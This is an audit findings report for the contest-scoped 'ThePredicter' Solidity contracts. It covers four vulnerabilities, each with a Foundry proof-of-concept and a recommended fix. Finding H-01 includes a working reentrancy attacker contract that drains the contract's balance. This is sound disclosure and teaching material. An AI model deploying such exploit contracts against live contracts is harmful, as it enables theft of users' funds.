# First Flight #20: The Predicter - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Reentrancy attack in `ThePredicter::cancelRegistration`](#H-01)
    - ### [H-02. `ThePredicter::makePrediction` has no access controls and any unapproved user can make predicitions causing an incorrect calculation and distribution of rewards](#H-02)
    - ### [H-03. Players who make only 1 prediction will be unable to claim a reward](#H-03)
- ## Medium Risk Findings
    - ### [M-01. Fee calculation in `ThePredicter::withdrawPredicitionFees` can cause organizer to withdraw more fees than intended and leave some users unable to claim ](#M-01)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #20

### Dates: Jul 18th, 2024 - Jul 25th, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-07-the-predicter)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 3
- Medium: 1
- Low: 0

### Selected for Cyfrin final report:
- [H-01. Reentrancy attack in `ThePredicter::cancelRegistration`](#H-01)


# High Risk Findings

## <a id='H-01'></a>H-01. Reentrancy attack in `ThePredicter::cancelRegistration`            



## Summary

`ThePredicter::cancelRegistration` does not follow the CEI pattern and therefore is vulnerable to a reentrancy attack from an external caller.

## Vulnerability Details

Relevent link- <https://github.com/Cyfrin/2024-07-the-predicter/blob/main/src/ThePredicter.sol>

Any user is able to register in `ThePredicter::register` and therefore would be able to call the `cancelRegistration` function to receive their refund. Due to an external call being made before updating the player's status, this function is vulnerable to a reentrancy attack. The user would be able to create an external contract that calls `cancelRegistration` every time it receive ether in a fallback function. The process can repeat until the contract balance is below the entrance fee.

```Solidity
function cancelRegistration() public {
        if (playersStatus[msg.sender] == Status.Pending) {
            //@audit-data function does not follow CEI pattern and can be called in a loop until contract balance is empty
@>          (bool success, ) = msg.sender.call{value: entranceFee}("");
            require(success, "Failed to withdraw");
            playersStatus[msg.sender] = Status.Canceled;
            return;
        }
        revert ThePredicter__NotEligibleForWithdraw();
    }
```

## POC

Create the following contract

```Solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ThePredicter} from "../src/ThePredicter.sol";
import {ScoreBoard} from "../src/ScoreBoard.sol";

contract ReentrancyAttacker {
    ThePredicter thePredicter;
    uint256 entranceFee;

    constructor(address _thePredicter) {
        thePredicter = ThePredicter(_thePredicter);
        entranceFee = thePredicter.entranceFee();
    }

    function attack() external payable {
        thePredicter.register{value: entranceFee}();
        thePredicter.cancelRegistration();
    }

    fallback() external payable {
        if (address(thePredicter).balance >= entranceFee) {
            thePredicter.cancelRegistration();
        }
    }
}
```

Add the following code to `ThePredicter.test.sol`

```Solidity

function test_reentrancyLoop() public {

        ReentrancyAttacker attacker = new ReentrancyAttacker(
            address(thePredicter)
        );

        address player1 = makeAddr("player1");
        address player2 = makeAddr("player2");
        address player3 = makeAddr("player3");

        vm.startPrank(player1);
        vm.deal(player1, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(player2);
        vm.deal(player2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(player3);
        vm.deal(player3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.deal(address(attacker), 1 ether);

        uint256 startingPredicterBalance = address(thePredicter).balance;
        uint256 startingAttackerBalance = address(attacker).balance;

        attacker.attack();

        uint256 endingPredicterBalance = address(thePredicter).balance;
        uint256 endingAttackerBalance = address(attacker).balance;

        assertEq(endingAttackerBalance, startingPredicterBalance + startingAttackerBalance);
        assertEq(endingPredicterBalance, 0);
    }

```

## Impact

* When users go to claim their rewards from `ThePredicter::withdraw`, the contract balance will be 0 preventing users from claiming any rewards they are eligible for
* Any user that wishes to cancel their registration and receive a refund will be unable to do so as the contract will have no balance to repay

## Tools Used

Slither and Manual Review

## Recommendations

Update the player's status before the external call to follow the CEI pattern

```diff

function cancelRegistration() public {
        if (playersStatus[msg.sender] == Status.Pending) {
+           playersStatus[msg.sender] = Status.Canceled;
@>          (bool success, ) = msg.sender.call{value: entranceFee}("");
            require(success, "Failed to withdraw");
-           playersStatus[msg.sender] = Status.Canceled;
            return;
        }
        revert ThePredicter__NotEligibleForWithdraw();
    }

```

## <a id='H-02'></a>H-02. `ThePredicter::makePrediction` has no access controls and any unapproved user can make predicitions causing an incorrect calculation and distribution of rewards            



## Summary

`ThePredicter::makePrediction` has no access controls and any unapproved user can make predicitions causing an incorrect calculation and distribution of rewards

## Vulnerability Details

Relevant links
<https://github.com/Cyfrin/2024-07-the-predicter/blob/main/src/ThePredicter.sol>

Any user can call `ThePredicter::makePrediction` without the organizer's approval. When `totalShares` is calculated in `ThePredicter::withdraw` it only takes into account approved users. Because of the discrepency between the number of approved users and actual users who made a predicition, the proportion to the points collected by all Players with a positive number of points is incorrect.

```Solidity
function makePrediction(
        uint256 matchNumber,
        ScoreBoard.Result prediction
    ) public payable {
        if (msg.value != predictionFee) {
            revert ThePredicter__IncorrectPredictionFee();
        }

        if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
            revert ThePredicter__PredictionsAreClosed();
        }

        scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
        scoreBoard.setPrediction(msg.sender, matchNumber, prediction);
    }
```

Total shares are calculated incorrectly in `ThePredicter::withdraw` because the attacker is not in the approved players array

```Solidity
for (uint256 i = 0; i < players.length; ++i) {
            int8 cScore = scoreBoard.getPlayerScore(players[i]);
            if (cScore > maxScore) maxScore = cScore;
            if (cScore > 0) totalPositivePoints += cScore;
        }
```

reward for each user will be incorrect

```Solidity
        uint256 shares = uint8(score);
        uint256 totalShares = uint256(totalPositivePoints);
        uint256 reward = 0;

        reward = maxScore < 0
            ? entranceFee
            : (shares * players.length * entranceFee) / totalShares;
```

## POC

Add the following test to ThePredicter.test.sol

```Solidity
function test_unapprovedPredictions() public {
        
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        address attacker = makeAddr("attacker");

        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3);
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        //attacker comes in and makes a prediciton. Doesnt even need to register.
        vm.startPrank(attacker);
        vm.deal(attacker, 1 ether);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger2.balance, 0.9997 ether);

        //attacker front runs the last player
        vm.startPrank(attacker);
        thePredicter.withdraw();
        vm.stopPrank();

        //address balance is already 0 before the last player can withdraw their reward
        //reverts with EVM error OutOfFunds
        vm.startPrank(stranger3);
        assertEq(address(thePredicter).balance, 0 ether);
        vm.expectRevert("Failed to withdraw");
        thePredicter.withdraw();
        vm.stopPrank();
    }
```

## Impact

An attacker can withdraw before the contract balance runs out and some users will be unable to claim the reward they are entitled to.

## Tools Used
Manual Review

## Recommendations
Add a new custom error in `ThePredicter`
```diff
    error ThePredicter__IncorrectEntranceFee();
    error ThePredicter__RegistrationIsOver();
    error ThePredicter__IncorrectPredictionFee();
    error ThePredicter__AllPlacesAreTaken();
    error ThePredicter__CannotParticipateTwice();
    error ThePredicter__NotEligibleForWithdraw();
    error ThePredicter__PredictionsAreClosed();
    error ThePredicter__UnauthorizedAccess();
+   error ThePredicter__UnapprovedUser();
```

Revert in `makePrediction` if user is not approved to be a player
```diff
 function makePrediction(
        uint256 matchNumber,
        ScoreBoard.Result prediction
    ) public payable {
        if (msg.value != predictionFee) {
            revert ThePredicter__IncorrectPredictionFee();
        }

        if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
            revert ThePredicter__PredictionsAreClosed();
        }

+       if (playersStatus[msg.sender] != Status.Approved) {
+           revert ThePredicter__UnapprovedUser();
+       }

        scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
        scoreBoard.setPrediction(msg.sender, matchNumber, prediction);
    }
```

## <a id='H-03'></a>H-03. Players who make only 1 prediction will be unable to claim a reward            



## Summary

The `isEligibleForReward` function checks that the last match result has been set and that the player has made more than one prediction. Any player that pays one prediction fee should be eligible for reward according to docs, however `isEligibleForReward` returns false for any user with 1 prediction.

## Vulnerability Details

If an approved player makes a prediction and pays the prediction fee, they are eligible for a reward according to documentation. Currently `isEligibleForReward` returns false for any player with one prediction. When they try to withdraw, it will revert with the custom error `ThePredicter__NotEligibleForWithdraw` in `ThePredicter::withdraw`.

```solidity
function isEligibleForReward(address player) public view returns (bool) {
        return
            results[NUM_MATCHES - 1] != Result.Pending &&
            //@audit-data a user who makes one prediction will be ineligible for their reward
@>          playersPredictions[player].predictionsCount > 1;
    }
```

```solidity
   function withdraw() public {
        if (!scoreBoard.isEligibleForReward(msg.sender)) {
            revert ThePredicter__NotEligibleForWithdraw();
        }
```

## POC

Add test to ThePredicter.test.sol
Reverts when player who makes one prediction and gets it right attempts to claim reward

```solidity
function test_userCantWithdraw() public {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3);
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.withdraw();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.expectRevert(
            abi.encodeWithSelector(
                ThePredicter__NotEligibleForWithdraw.selector
            )
        );
        thePredicter.withdraw();
        vm.stopPrank();
    }
```

## Impact

Any user with one prediction will be unable to claim a reward

## Tools Used

Manual Review

## Recommendations

Change check to ensure `playersPredictions[player].predictionsCount` is >= 1

```diff
    function isEligibleForReward(address player) public view returns (bool) {
        return
            results[NUM_MATCHES - 1] != Result.Pending &&
            //@audit-data a user who makes one prediction will be ineligible for their reward
-           playersPredictions[player].predictionsCount > 1;
+           playersPredictions[player].predictionsCount >= 1;
    }
```

    
# Medium Risk Findings

## <a id='M-01'></a>M-01. Fee calculation in `ThePredicter::withdrawPredicitionFees` can cause organizer to withdraw more fees than intended and leave some users unable to claim             



## Summary

Fee calculation in `ThePredicter::withdrawPredicitionFees` can cause the organizer to withdraw more fees than intended and leave some users unable to claim their entrance fee or prevent players from claiming their reward

## Vulnerability Details

The following formula is used to calculate the amount of prediction fees that should be withdrawn from the contract. The problem is that `address(this).balance` will include entrance fees of users who are not approved players in the `players` array. There are instances where a user may want to cancel their registration or a player will want to redeem their rewards but will be unable to do so as their fee has been incorrectly withdrawn.

```solidity
function withdrawPredictionFees() public {
        if (msg.sender != organizer) {
            revert ThePredicter__NotEligibleForWithdraw();
        }

        uint256 fees = address(this).balance - players.length * entranceFee;
        (bool success, ) = msg.sender.call{value: fees}("");
        require(success, "Failed to withdraw");
    }
```

## Impact

A user may want to cancel their registration or a player may want to redeem their rewards but will be unable to do so.

## POC

Add the following test to ThePredicter.test.sol

```solidity
function test_breakPredictionFeesWithdrawal() public {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        address stranger4 = makeAddr("stranger4");

        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            0,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            0,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.Draw);
        scoreBoard.setResult(1, ScoreBoard.Result.Draw);
        scoreBoard.setResult(8, ScoreBoard.Result.Draw);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.withdraw();
        vm.stopPrank();

        //Unapproved user withdraws their entrance fee
        vm.startPrank(stranger3);
        thePredicter.cancelRegistration();
        vm.stopPrank();

        //player 2 can no longer redeem their reward because the contract balance is 0
        vm.startPrank(stranger2);
        vm.assertEq(address(thePredicter).balance, 0 ether);
        vm.expectRevert("Failed to withdraw");
        thePredicter.withdraw();
        vm.stopPrank();
    }
```

## Tools Used

Manual Review

## Recommendations

Create a state variable to track the amount of prediction fees collected

```diff
    address public organizer;
    address[] public players;
    uint256 public entranceFee;
    uint256 public predictionFee;
+   uint256 public predictionFeesCollected;
    ScoreBoard public scoreBoard;
    mapping(address players => Status) public playersStatus;
```

Update the state variable each time a prediciton is made

```diff
function makePrediction(
        uint256 matchNumber,
        ScoreBoard.Result prediction
    ) public payable {
        if (msg.value != predictionFee) {
            revert ThePredicter__IncorrectPredictionFee();
        }

        if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
            revert ThePredicter__PredictionsAreClosed();
        }

        scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
        scoreBoard.setPrediction(msg.sender, matchNumber, prediction);

+       predictionFeesCollected += msg.value;
    }
```

Use `predictionFeesCollected` as withdraw amount

```diff
    function withdrawPredictionFees() public {
        if (msg.sender != organizer) {
            revert ThePredicter__NotEligibleForWithdraw();
        }

-       uint256 fees = address(this).balance - players.length * entranceFee;
+       (bool success, ) = msg.sender.call{value: predictionFeesCollected}("");
        require(success, "Failed to withdraw");
    }
```





